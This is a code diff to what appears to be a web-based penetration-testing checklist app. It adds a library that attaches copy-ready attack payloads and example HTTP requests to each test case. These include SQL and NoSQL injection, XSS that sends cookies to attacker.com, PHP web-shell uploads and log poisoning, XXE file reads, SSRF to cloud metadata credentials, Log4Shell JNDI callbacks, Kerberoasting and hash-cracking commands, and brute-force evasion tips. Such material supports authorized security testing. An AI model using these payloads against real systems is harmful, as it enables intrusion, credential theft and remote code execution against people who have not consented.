@@ -134,6 +134,18 @@ h1,h2,h3,h4{font-family:var(--font-display);text-wrap:balance;margin:0}
 .vars li{background:var(--surface-2);border:1px solid var(--line);border-radius:6px;padding:2px 8px;font-size:.8rem;color:var(--muted)}
 .verify{margin:0;font-size:.86rem;color:var(--muted)}
 .verify b{font-family:var(--font-mono);font-size:.65rem;letter-spacing:.12em;text-transform:uppercase;color:var(--brand);margin-right:6px}
+.pbox{margin-top:2px;padding:8px 10px;border:1px dashed var(--line);border-radius:10px;background:rgba(34,211,238,.04)}
+.pbox b{font-family:var(--font-mono);font-size:.62rem;letter-spacing:.12em;text-transform:uppercase;color:var(--brand);display:block;margin-bottom:6px}
+.pbox.hint{background:rgba(255,205,60,.06);border-color:rgba(255,205,60,.3)}
+.pbox.hint b{color:var(--sev-m)}
+.hintline{margin:0;font-size:.82rem;color:var(--muted);line-height:1.45}
+.pchips{display:flex;flex-wrap:wrap;gap:6px}
+.pchip{font-family:var(--font-mono);font-size:.74rem;background:rgba(4,10,18,.6);border:1px solid var(--line);border-radius:7px;padding:4px 9px;color:var(--ink);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:left}
+.pchip:hover{border-color:var(--brand);color:var(--brand)}
+.reqbox{position:relative;background:#030a12;border:1px solid var(--line);border-radius:10px;padding:14px 12px 12px}
+.reqbox pre{margin:0;font-family:var(--font-mono);font-size:.78rem;color:#8ff0c8;white-space:pre-wrap;word-break:break-word;line-height:1.55}
+.copybtn{position:absolute;top:8px;right:8px;font-size:.66rem;padding:4px 9px;border-radius:6px;border:1px solid var(--line);background:rgba(4,10,18,.7);color:var(--muted);font-family:var(--font-mono)}
+.copybtn:hover{color:var(--brand);border-color:var(--brand)}
 .tc-act{display:flex;flex-direction:column;gap:8px;align-items:flex-end}
 .seg{display:flex;gap:5px}
 .seg button{display:inline-flex;align-items:center;gap:6px;border:1.5px solid var(--line);background:var(--surface);border-radius:9px;padding:7px 11px;font-size:.82rem;font-weight:700;color:var(--muted);transition:all .15s}
@@ -151,6 +163,7 @@ h1,h2,h3,h4{font-family:var(--font-display);text-wrap:balance;margin:0}
 .tc-notes{grid-column:1/-1;display:grid;grid-template-columns:minmax(0,1fr);gap:10px;padding-top:12px;border-top:1px dashed var(--line)}
 .tc-notes .row{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
 .tc-notes label{font-family:var(--font-mono);font-size:.66rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);font-weight:600}
+.tc-req{grid-column:1/-1;padding-top:12px;border-top:1px dashed var(--line)}
 textarea,input[type=text],select{background:rgba(4,10,18,.6);border:1.5px solid var(--line);border-radius:9px;padding:9px 12px;width:100%;color:var(--ink)}
 textarea{resize:vertical;min-height:72px;font-family:var(--font-mono);font-size:.82rem}
 textarea:focus,input:focus,select:focus{border-color:var(--brand);outline:none;box-shadow:0 0 0 3px var(--brand-soft)}
@@ -645,10 +658,10 @@ T-303|PHP Wrappers|php://filter¦php://input¦data://¦expect://|Wrappers disabl
 T-304|Log Poisoning for LFI|Inject PHP in access.log¦User-Agent poisoning¦Apache error log poisoning|Log sanitized
 T-305|eval Injection|User input into eval()¦dynamic code construction|No dynamic eval
 T-306|include / require Injection|User-controlled path¦remote include|Allowlist
-T-307|Expression Language (EL) Injection|\${7*7}¦#{7*7}¦\${applicationScope}|Escaped
+T-307|Expression Language (EL) Injection|${7*7}¦#{7*7}¦${applicationScope}|Escaped
 T-308|OGNL Injection (Struts2)|%{(#_='multipart/form-data')}¦%{#a=(new java.lang.ProcessBuilder(...))}|Patched
 T-309|Groovy Injection|Groovy script payload¦dynamic Groovy compilation|Sandboxed
-T-310|JNDI Injection (Log4Shell)|\${jndi:ldap://attacker/a}¦\${jndi:rmi://attacker/a}¦\${jndi:dns://}|Patched / disabled
+T-310|JNDI Injection (Log4Shell)|${jndi:ldap://attacker/a}¦${jndi:rmi://attacker/a}¦${jndi:dns://}|Patched / disabled
 T-311|BeanShell Injection|Interpreter.eval¦script injection|No user eval
 T-312|Server-side JS Injection (Node)|eval()¦Function()¦require() injection|No user eval
 T-313|Python eval/exec Injection|eval() injection¦pickle deserialization|No eval
@@ -672,7 +685,7 @@ T-328|X-Forwarded-Host Poisoning|Spoof host in cache|Header not trusted
 T-329|X-Forwarded-Scheme Poisoning|Spoof scheme|Header not trusted
 T-330|Unkeyed Query Param Poisoning|?utm=...¦?fbclid=... cached|Params keyed/ignored
 #CVEC|4|both|CVE-Specific Verifications
-T-340|Log4Shell (CVE-2021-44228)|\${jndi:ldap://attacker/a}¦\${jndi:rmi://}|Patched / JNDI off
+T-340|Log4Shell (CVE-2021-44228)|${jndi:ldap://attacker/a}¦${jndi:rmi://}|Patched / JNDI off
 T-341|Spring4Shell (CVE-2022-22965)|Class loader manipulation¦data binding payload|Patched
 T-342|ProxyLogon / ProxyShell|Exchange auth bypass|Patched
 T-343|Citrix Bleed (CVE-2023-4966)|Session token leak|Patched
@@ -958,6 +971,226 @@ const SEV = { C: "Critical", H: "High", M: "Medium", L: "Low", I: "Info" };
 const SEV_ORDER = ["C", "H", "M", "L", "I"];
 const SEV_COL = { C: "var(--sev-c)", H: "var(--sev-h)", M: "var(--sev-m)", L: "var(--sev-l)", I: "var(--sev-i)", U: "var(--muted)" };
 
+/* ---------- Payload / Hint Library ----------
+   Each rule is tested (by regex) against the lowercased
+   id + title + vars + suite-name of a test case. When it
+   matches, its payload strings and example request are
+   offered as ready-to-fire PoC material. Rules are additive:
+   a test can match several and the chips get merged/deduped.
+   Anything that matches nothing falls back to a generic
+   manual-verification hint built from its own data. */
+const PAYLOAD_RULES = [
+  { m:/sql injection|sqli\b|tautology|sql wildcard|union select/,
+    payloads:["' OR '1'='1' -- -","admin'-- -","' UNION SELECT NULL,NULL,NULL-- -","1' AND SLEEP(5)-- -","1; DROP TABLE users-- -"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":\"admin'-- -\",\"password\":\"x\"}" },
+  { m:/nosql injection|nosql|\$ne|\$gt|operator injection|operator-object/,
+    payloads:['{"username":{"$ne":null},"password":{"$ne":null}}','{"username":{"$gt":""},"password":{"$gt":""}}','{"username":"admin","password":{"$regex":"^."}}'],
+    req:"POST /api/login HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}" },
+  { m:/ldap/,
+    payloads:["*)(uid=*))(|(uid=*","admin*","*)(|(password=*","*)(objectClass=*"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/x-www-form-urlencoded\n\nusername=*)(uid=*))(|(uid=*&password=x" },
+  { m:/xpath/,
+    payloads:["' or '1'='1","x' or 1=1 or 'x'='x","' or count(parent::*[position()=1])=1 or '","admin' and substring(//user[1]/password,1,1)='a"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":\"admin' or '1'='1\",\"password\":\"x\"}" },
+  { m:/command injection|os command/,
+    payloads:["; id","| whoami","`id`","$(id)","127.0.0.1; cat /etc/passwd","127.0.0.1 & ping -c 10 attacker.com"],
+    req:"POST /api/ping HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"host\":\"127.0.0.1; id\"}" },
+  { m:/ssti|server-side template injection|freemarker|velocity|twig|angularjs sandbox|client-side template/,
+    payloads:["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","{{constructor.constructor('alert(1)')()}}","{{config.items()}}"],
+    req:"POST /render HTTP/1.1\nHost: target.tld\nContent-Type: application/x-www-form-urlencoded\n\nname={{7*7}}" },
+  { m:/orm injection|hql|jpql|dql/,
+    payloads:["' OR 1=1--","' UNION SELECT u.password FROM User u--","1 OR 1=1"],
+    req:"GET /api/search?q=' OR 1=1-- HTTP/1.1\nHost: target.tld" },
+  { m:/reflected xss/,
+    payloads:["<script>alert(document.domain)</script>","\"><img src=x onerror=alert(1)>","javascript:alert(1)","'\"><svg onload=alert(1)>"],
+    req:"GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1\nHost: target.tld" },
+  { m:/stored xss/,
+    payloads:["<script>alert(document.domain)</script>","<img src=x onerror=fetch('//attacker.com/c?'+document.cookie)>","<svg/onload=alert(1)>"],
+    req:"POST /api/comments HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"body\":\"<img src=x onerror=fetch('//attacker.com/c?'+document.cookie)>\"}" },
+  { m:/dom-based xss|dom clobbering/,
+    payloads:["#<img src=x onerror=alert(1)>","javascript:alert(1)","<a id=\"x\"><a id=\"x\" name=\"attributes\">"],
+    req:"GET /page#<img src=x onerror=alert(1)> HTTP/1.1\nHost: target.tld" },
+  { m:/\bxss\b/,
+    payloads:["<script>alert(document.domain)</script>","\"><svg onload=alert(1)>","<img src=x onerror=alert(1)>"],
+    req:"POST /api/upload HTTP/1.1\nHost: target.tld\nContent-Type: multipart/form-data\n\n--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"xss.svg\"\nContent-Type: image/svg+xml\n\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>\n--boundary--" },
+  { m:/path traversal|lfi\b|local file inclusion|directory traversal|file read/,
+    payloads:["../../../../etc/passwd","..%2f..%2f..%2fetc%2fpasswd","..\\..\\..\\windows\\win.ini","....//....//....//etc/passwd","/proc/self/environ"],
+    req:"GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: target.tld" },
+  { m:/remote file inclusion|rfi\b/,
+    payloads:["http://attacker.com/shell.txt","ftp://attacker.com/shell.txt","\\\\attacker.com\\share\\shell.txt"],
+    req:"GET /include?page=http://attacker.com/shell.txt HTTP/1.1\nHost: target.tld" },
+  { m:/php wrapper/,
+    payloads:["php://filter/convert.base64-encode/resource=config.php","php://input","data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+","expect://id"],
+    req:"GET /include?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1\nHost: target.tld" },
+  { m:/log poisoning/,
+    payloads:["User-Agent: <?php system($_GET['c']); ?>","GET /<?php system($_GET[0]); ?> HTTP/1.1"],
+    req:"GET /index.php?page=../../../var/log/apache2/access.log%00 HTTP/1.1\nHost: target.tld\nUser-Agent: <?php system($_GET['c']); ?>" },
+  { m:/xxe|xml entity|billion laughs|quadratic blowup|xinclude|external dtd/,
+    payloads:["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>","<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>"],
+    req:"POST /api/import HTTP/1.1\nHost: target.tld\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<foo>&xxe;</foo>" },
+  { m:/soap injection|wsdl|xml signature|xml namespace|xml schema|xml-rpc/,
+    payloads:["<soap:Body><user>admin</user><cmd>'; DROP TABLE x;--</cmd></soap:Body>","?wsdl","<methodCall><methodName>system.multicall</methodName></methodCall>"],
+    req:"POST /soap-endpoint HTTP/1.1\nHost: target.tld\nContent-Type: text/xml\nSOAPAction: \"urn:getUser\"\n\n<soap:Envelope><soap:Body><getUser><id>1 OR 1=1</id></getUser></soap:Body></soap:Envelope>" },
+  { m:/ssrf|server-side request forgery|internal network probe|protocol exploitation|dns rebinding|blind ssrf|redirect-based ssrf|metadata service|callback.*url|url fetcher/,
+    payloads:["http://127.0.0.1:80/","http://169.254.169.254/latest/meta-data/iam/security-credentials/","http://[::1]/","file:///etc/passwd","http://attacker-collaborator.oastify.com/ssrf-test","gopher://127.0.0.1:6379/_SET%20key%20val"],
+    req:"POST /api/fetch HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}" },
+  { m:/open redirect/,
+    payloads:["//evil.com","https://target.tld.evil.com","/\\evil.com","https://trusted.com@evil.com","/redirect/../../evil.com"],
+    req:"GET /redirect?next=//evil.com HTTP/1.1\nHost: target.tld" },
+  { m:/cors/,
+    payloads:["Origin: https://evil.com","Origin: null","Origin: target.tld.evil.com"],
+    req:"GET /api/account HTTP/1.1\nHost: target.tld\nOrigin: https://evil.com\nCookie: session=<victim_session>" },
+  { m:/crlf|header injection|response splitting/,
+    payloads:["%0d%0aSet-Cookie:%20pwned=1","%0d%0aX-Injected:%20true","\\r\\nLocation: https://evil.com"],
+    req:"GET /redirect?url=/home%0d%0aSet-Cookie:%20pwned=1 HTTP/1.1\nHost: target.tld" },
+  { m:/request smuggling|h2\.cl|h2\.te|hpack|pseudo-header|http\/2 downgrade/,
+    payloads:["Content-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED","Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x"],
+    req:"POST / HTTP/1.1\nHost: target.tld\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX: X" },
+  { m:/host header/,
+    payloads:["Host: evil.com","X-Forwarded-Host: evil.com","Host: target.tld.evil.com"],
+    req:"POST /forgot-password HTTP/1.1\nHost: evil.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=victim@target.tld" },
+  { m:/cache poisoning|cache deception|cache key|web cache/,
+    payloads:["X-Forwarded-Host: evil.com","/account/profile.css","?utm_fake=1 (unkeyed param)"],
+    req:"GET /account/profile.css HTTP/1.1\nHost: target.tld\nCookie: session=<victim_session>" },
+  { m:/jwt/,
+    payloads:["{\"alg\":\"none\",\"typ\":\"JWT\"} (strip signature)","HS256 signed with the RS256 public key as secret","{\"role\":\"admin\"} injected into payload claims"],
+    req:"GET /api/me HTTP/1.1\nHost: target.tld\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9." },
+  { m:/redirect_uri|oauth|pkce|state parameter|authorization code|client_id|grant_type|response_type|scope escalation/,
+    payloads:["redirect_uri=https://evil.com","redirect_uri[]=https://evil.com","state omitted (CSRF)","scope=openid%20admin"],
+    req:"GET /oauth/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code&scope=openid HTTP/1.1\nHost: idp.target.tld" },
+  { m:/saml/,
+    payloads:["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> (in Assertion)","moved/duplicated <Signature> block (XSW)","RelayState=//evil.com"],
+    req:"POST /saml/acs HTTP/1.1\nHost: target.tld\nContent-Type: application/x-www-form-urlencoded\n\nSAMLResponse=<base64 tampered assertion>&RelayState=//evil.com" },
+  { m:/mass assignment|prototype pollution|__proto__/,
+    payloads:['{"role":"admin"}','{"isAdmin":true}','{"__proto__":{"isAdmin":true}}','{"verified":true,"plan":"premium"}'],
+    req:"POST /api/users HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":\"bob\",\"email\":\"bob@x.com\",\"role\":\"admin\"}" },
+  { m:/array|\[\]|type confusion|object injection|boolean coercion|null byte|whitespace padding|unicode normalization|homoglyph|magic hash|case-sensitivity|null \/ empty coercion/,
+    payloads:['username[]=admin&username[]=victim','{"username":["admin","victim"]}','{"username":{"$ne":null}}','username=admin%00','username= admin '],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":[\"admin\",\"victim\"],\"password\":\"x\"}" },
+  { m:/graphql|introspection|alias overload|batching/,
+    payloads:["{__schema{types{name fields{name}}}}","query{a:user(id:1){password} b:user(id:2){password}}","[{\"query\":\"{user(id:1){password}}\"},{\"query\":\"{user(id:2){password}}\"}]"],
+    req:"POST /graphql HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"query\":\"{__schema{types{name fields{name}}}}\"}" },
+  { m:/rate limit|brute force|lockout|credential stuffing|password spraying/,
+    payloads:["Fire 50+ login attempts in <10s with a password list","Rotate X-Forwarded-For per attempt to dodge IP-based limits","Spray one common password across 100 usernames"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nX-Forwarded-For: 203.0.113.<i>\nContent-Type: application/json\n\n{\"username\":\"victim\",\"password\":\"Summer2024!\"}" },
+  { m:/password reset|reset token/,
+    payloads:["Request reset, then try token=000000..999999","Swap userid param while keeping your own valid token","Reuse a token after it should have expired/been consumed"],
+    req:"POST /reset-password HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"userId\":1,\"token\":\"<your-own-token>\",\"newPassword\":\"Pwned123!\"}" },
+  { m:/session fixation|cookie flag|session in url|session timeout|session token entropy/,
+    payloads:["Set session=attackerknown before login, check it's unchanged after","Reuse session cookie after logout",";jsessionid=<fixed-value> in URL"],
+    req:"GET /dashboard HTTP/1.1\nHost: target.tld\nCookie: session=attacker-chosen-value-123" },
+  { m:/csrf/,
+    payloads:["<form action=\"https://target.tld/account/email\" method=\"POST\"><input name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit()</script>"],
+    req:"POST /account/email HTTP/1.1\nHost: target.tld\nCookie: session=<victim_session>\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker@evil.com (sent cross-site, no CSRF token)" },
+  { m:/file upload|zip slip|polyglot|imagetragick|magic byte|double extension/,
+    payloads:["shell.php%00.jpg","shell.php.jpg","shell.phtml","GIF89a<?php system($_GET['c']); ?>","../../var/www/html/shell.php (zip entry name)"],
+    req:"POST /upload HTTP/1.1\nHost: target.tld\nContent-Type: multipart/form-data; boundary=X\n\n--X\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\"\nContent-Type: image/jpeg\n\nGIF89a<?php system($_GET['c']); ?>\n--X--" },
+  { m:/negative|price tamper|quantity overflow|decimal precision|currency conversion|coupon|gift card|loyalty points|referral fraud|rounding/,
+    payloads:['{"qty":-1,"price":99.99}','{"price":0.01}','{"qty":999999999999}','{"couponCode":"SAVE10","applyCount":5}'],
+    req:"POST /api/cart/add HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"productId\":42,\"qty\":-5,\"price\":99.99}" },
+  { m:/race condition|toctou/,
+    payloads:["Fire the same request 20-50x concurrently (Turbo Intruder / ffuf -c)","Redeem one coupon code in 20 parallel requests"],
+    req:"POST /api/coupons/redeem HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"code\":\"SAVE50\"}  (send this identical request 30x in parallel)" },
+  { m:/default credential/,
+    payloads:["admin:admin","admin:password","root:root","tomcat:tomcat","test:test"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin" },
+  { m:/directory listing|backup\/sensitive|\.git\/|\.svn\/|backup file|source code disclosure/,
+    payloads:["/.git/config","/.env",".DS_Store","/backup.zip","/web.config.bak","/.svn/entries"],
+    req:"GET /.git/config HTTP/1.1\nHost: target.tld" },
+  { m:/error message|stack trace|verbose error/,
+    payloads:["id=abc' (force a SQL type error)","Content-Type: application/json with malformed body {","Send an unexpected field type to trigger a 500"],
+    req:"GET /api/users/abc HTTP/1.1\nHost: target.tld   (non-numeric id to force a stack trace)" },
+  { m:/security headers/,
+    payloads:["Check response for: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy"],
+    req:"curl -I https://target.tld/" },
+  { m:/clickjacking/,
+    payloads:["<iframe src=\"https://target.tld/account/delete\" style=\"opacity:0.001;position:absolute\"></iframe>"],
+    req:"<html><body><iframe src=\"https://target.tld/dashboard\" width=800 height=600></iframe></body></html>" },
+  { m:/method tampering|http method/,
+    payloads:["TRACE","DELETE","PUT","X-HTTP-Method-Override: DELETE","X-Original-URL: /admin"],
+    req:"OPTIONS /api/users/1 HTTP/1.1\nHost: target.tld" },
+  { m:/parameter pollution/,
+    payloads:["id=1&id=2","id[]=1&id[]=2","role=user&role=admin"],
+    req:"GET /api/account?role=user&role=admin HTTP/1.1\nHost: target.tld" },
+  { m:/smtp injection|email header injection/,
+    payloads:["victim@x.com%0aBcc:attacker@evil.com","victim@x.com\\r\\nSubject: pwned"],
+    req:"POST /contact HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"email\":\"victim@x.com%0aBcc:attacker@evil.com\",\"message\":\"hi\"}" },
+  { m:/email bombing|sms bombing|phone number enumeration|username enumeration|user enumeration|account enumeration/,
+    payloads:["Compare response for known vs unknown username/email","Send 50 OTP/reset requests back-to-back for the same identifier"],
+    req:"POST /forgot-password HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"email\":\"known-valid@target.tld\"}   (repeat with an unknown address and diff the responses)" },
+  { m:/websocket|csw sh/,
+    payloads:["Connect without Sec-WebSocket + auth token","Origin: https://evil.com on the handshake","subscribe[]=victim_channel"],
+    req:"GET /ws HTTP/1.1\nHost: target.tld\nOrigin: https://evil.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13" },
+  { m:/s3\/gcs|bucket|azure blob|gcp storage|presigned url/,
+    payloads:["aws s3 ls s3://target-bucket --no-sign-request","https://target-bucket.s3.amazonaws.com/","https://storage.googleapis.com/target-bucket/"],
+    req:"GET https://target-bucket.s3.amazonaws.com/?list-type=2 HTTP/1.1" },
+  { m:/iam misconfig|lambda|serverless|container escape|kubernetes|docker api|secrets manager|cloud waf|cloud logging|cdn cache/,
+    payloads:["Request the IAM role creds via SSRF to 169.254.169.254","GET http://target:2375/containers/json (unauth Docker API)","GET http://target:10250/pods (unauth kubelet API)"],
+    req:"GET http://target.tld:2375/containers/json HTTP/1.1" },
+  { m:/certificate pinning|root\/jailbreak|webview|deep-link|intent redirection|clipboard|keyboard cache|screenshot|transport security|tampering detection|anti-debug|obfuscation|secure key storage|push notification|url scheme|nfc|bluetooth|biometric|apk|ipa/,
+    payloads:["frida -U -f com.target.app -l pinning-bypass.js","adb backup -apk com.target.app","objection -g com.target.app explore"],
+    req:"adb shell am start -W -a android.intent.action.VIEW -d \"targetapp://reset-password?token=x\" com.target.app" },
+  { m:/log4shell|jndi|spring4shell|proxylogon|citrix bleed|moveit|papercut|confluence ognl|ognl/,
+    payloads:["${jndi:ldap://attacker.com:1389/a}","${jndi:rmi://attacker.com/a}","%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"],
+    req:"GET /api/login HTTP/1.1\nHost: target.tld\nX-Api-Version: ${jndi:ldap://attacker.com:1389/a}\nUser-Agent: ${jndi:ldap://attacker.com:1389/a}" },
+  { m:/pass-the-hash|pass-the-ticket|kerberoast|as-rep roasting|golden.*ticket|silver.*ticket|ntlm relay|rainbow table|hash cracking/,
+    payloads:["GetUserSPNs.py domain/user:pass -dc-ip <dc> -request","GetNPUsers.py domain/ -usersfile users.txt -no-pass","hashcat -m 13100 spns.txt rockyou.txt"],
+    req:"(Active-Directory tooling, not an HTTP request) impacket-GetUserSPNs domain.local/lowpriv:Passw0rd -dc-ip 10.10.10.1 -request" },
+  { m:/deserialization|viewstate|pickle/,
+    payloads:["ysoserial -p ROME -c 'id' -o base64 (Java)","Malicious __reduce__ pickle payload (Python)","Tampered __VIEWSTATE with known MachineKey (.NET)"],
+    req:"POST /api/import HTTP/1.1\nHost: target.tld\nContent-Type: application/x-java-serialized-object\n\n<base64 ysoserial gadget-chain payload>" },
+  { m:/timing/,
+    payloads:["Time 50 requests per candidate value and compare mean response time"],
+    req:"POST /login HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"a\"}   (measure Δt vs \"password\":\"wrong-length-guess\")" },
+  { m:/subdomain takeover|zone transfer|certificate transparency/,
+    payloads:["dig axfr @ns1.target.tld target.tld","curl -s https://crt.sh/?q=%25.target.tld&output=json"],
+    req:"dig AXFR target.tld @ns1.target.tld" },
+  { m:/sri|integrity|ci\/cd|supply chain|auto-update/,
+    payloads:["Check <script src> tags for a missing integrity= attribute","Diff build artifact hash against the signed release"],
+    req:"GET / HTTP/1.1\nHost: target.tld   (inspect returned HTML for <script src=\"https://cdn...\"> with no integrity attribute)" },
+  { m:/hardcoded secret|secrets exposure|api key leak|secret in/,
+    payloads:["grep -R -Ei \"(api[_-]?key|secret|token)\\s*[:=]\" ./beautified-js/","truffleHog --regex --entropy=True https://github.com/org/repo.git"],
+    req:"GET /static/js/main.bundle.js HTTP/1.1\nHost: target.tld   (grep response for api_key=, secret=, AKIA..., etc.)" },
+  { m:/grpc|json-rpc|xml-rpc|content-type negotiation/,
+    payloads:["grpcurl -plaintext target.tld:443 list","{\"jsonrpc\":\"2.0\",\"method\":\"admin.deleteUser\",\"params\":[1],\"id\":1}"],
+    req:"POST /rpc HTTP/1.1\nHost: target.tld\nContent-Type: application/json\n\n{\"jsonrpc\":\"2.0\",\"method\":\"admin.deleteUser\",\"params\":[1],\"id\":1}" }
+];
+
+function literalLikePayload(v) {
+  return /[{}<>]|\.\.\/|%00|\$ne|\$gt|jndi:|ognl|\[\]=|:\/\/|\\x00|or '1'='1|\$\{|<!entity|union select/i.test(v);
+}
+
+function genericReq(s) {
+  if (s.scope === 'api') {
+    return "GET /api/<endpoint> HTTP/1.1\nHost: target.tld\nAuthorization: Bearer <low-priv-token>\nContent-Type: application/json\n\n{}";
+  }
+  return "GET /<path> HTTP/1.1\nHost: target.tld\nCookie: session=<low-priv-session>";
+}
+
+function getPayloadData(s, x) {
+  const [id, title, vars, verify] = x;
+  const hay = (id + " " + title + " " + vars.join(" ") + " " + s.name).toLowerCase();
+  let payloads = [];
+  let req = null;
+  PAYLOAD_RULES.forEach(rule => {
+    if (rule.m.test(hay)) {
+      payloads.push(...rule.payloads);
+      if (!req) req = rule.req;
+    }
+  });
+  vars.forEach(v => { if (literalLikePayload(v) && !payloads.includes(v)) payloads.push(v); });
+  payloads = [...new Set(payloads)].slice(0, 6);
+
+  if (payloads.length) {
+    return { payloads, req: req || genericReq(s), hint: null };
+  }
+  return {
+    payloads: [],
+    req: genericReq(s),
+    hint: `No drop-in payload applies here — this is a logic/configuration check. Manually verify: "${verify}". Walk through each variant by hand or in Burp Repeater: ${vars.join(', ')}.`
+  };
+}
+
 /* ---------- Application State ---------- */
 let activeProject = null;
 let currentResults = {}; // test_id -> { s: 'pass'|'fail'|'na', v: 'C'|'H'|..., n: '', t: timestamp }
@@ -966,6 +1199,7 @@ let ui = {
   status: "all",
   q: "",
   notes: new Set(),
+  req: new Set(),
   focus: null
 };
 
@@ -1358,9 +1592,34 @@ function cardHtml(s, x, showCategory = false) {
   const r = currentResults[id] || {};
   const st = r.s || '';
   const openNotes = ui.notes.has(id);
+  const openReq = ui.req.has(id);
 
   const sevPill = st === 'fail' && r.v && SEV[r.v] ? `<span class="sevpill" data-v="${r.v}">${SEV[r.v]}</span>` : '';
   const catBadge = showCategory ? `<span style="color:var(--brand); font-family:var(--font-mono); font-size:.7rem;">${s.id} · ${esc(s.name)}</span>` : '';
+
+  const pd = getPayloadData(s, x);
+  const payloadsHtml = pd.payloads.length ? `
+    <div class="pbox">
+      <b>Try these payloads</b>
+      <div class="pchips">
+        ${pd.payloads.map(p => `<button class="pchip" onclick="copyPayload(this)" data-p="${esc(p)}" title="Click to copy">${esc(p.length > 70 ? p.slice(0, 67) + '...' : p)}</button>`).join('')}
+      </div>
+    </div>
+  ` : `
+    <div class="pbox hint">
+      <b>No single payload — manual check</b>
+      <p class="hintline">${esc(pd.hint)}</p>
+    </div>
+  `;
+
+  const reqSection = openReq ? `
+    <div class="tc-req">
+      <div class="reqbox">
+        <button class="copybtn" onclick="copyReq(this)">Copy</button>
+        <pre>${esc(pd.req)}</pre>
+      </div>
+    </div>
+  ` : '';
 
   const notesSection = openNotes ? `
     <div class="tc-notes">
@@ -1398,6 +1657,7 @@ function cardHtml(s, x, showCategory = false) {
           ${vars.map(v => `<li>${esc(v)}</li>`).join('')}
         </ul>
         <p class="verify"><b>Expect:</b> ${esc(verify)}</p>
+        ${payloadsHtml}
         ${!openNotes && r.n ? `<p style="font-size:.82rem; color:var(--muted); font-style:italic; margin:4px 0 0;">"${esc(r.n.slice(0, 100))}${r.n.length > 100 ? '...' : ''}"</p>` : ''}
       </div>
 
@@ -1407,10 +1667,12 @@ function cardHtml(s, x, showCategory = false) {
           <button data-v="fail" aria-pressed="${st === 'fail'}" onclick="markTest('${id}', 'fail')">Fail</button>
           <button data-v="na" aria-pressed="${st === 'na'}" onclick="markTest('${id}', 'na')">N/A</button>
         </div>
+        <button class="btn sm" onclick="toggleReq('${id}')">${openReq ? 'Hide Example Req' : 'Example Req'}</button>
         <button class="btn sm" onclick="toggleNotes('${id}')">
           ${openNotes ? 'Close Notes' : (r.n ? 'Edit PoC' : '+ Add Evidence')}
         </button>
       </div>
+      ${reqSection}
       ${notesSection}
     </article>
   `;
@@ -1459,6 +1721,25 @@ function toggleNotes(id) {
     ui.notes.add(id);
   }
   renderAll();
+}
+
+function toggleReq(id) {
+  if (ui.req.has(id)) {
+    ui.req.delete(id);
+  } else {
+    ui.req.add(id);
+  }
+  renderAll();
+}
+
+function copyPayload(btn) {
+  const v = btn.getAttribute('data-p');
+  navigator.clipboard.writeText(v).then(() => showToast('Payload copied', 'ok')).catch(() => showToast('Copy failed', 'err'));
+}
+
+function copyReq(btn) {
+  const pre = btn.nextElementSibling;
+  navigator.clipboard.writeText(pre.textContent).then(() => showToast('Request copied', 'ok')).catch(() => showToast('Copy failed', 'err'));
 }
 
 function goView(v) {
